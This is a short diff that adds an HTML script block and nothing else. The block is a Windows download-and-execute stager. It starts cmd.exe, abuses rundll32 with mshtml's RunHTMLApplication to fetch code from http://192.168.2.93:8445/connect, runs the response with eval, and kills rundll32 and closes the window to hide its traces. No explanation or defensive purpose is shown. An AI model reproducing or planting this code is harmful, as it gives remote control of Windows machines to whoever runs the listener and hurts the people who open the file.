@@ -1,0 +1,4 @@
+<script>
+a=new ActiveXObject("WScript.Shell");
+a.run('%windir%\\System32\\cmd.exe /c rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.93:8445/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}', 0);window.close();
+</script>
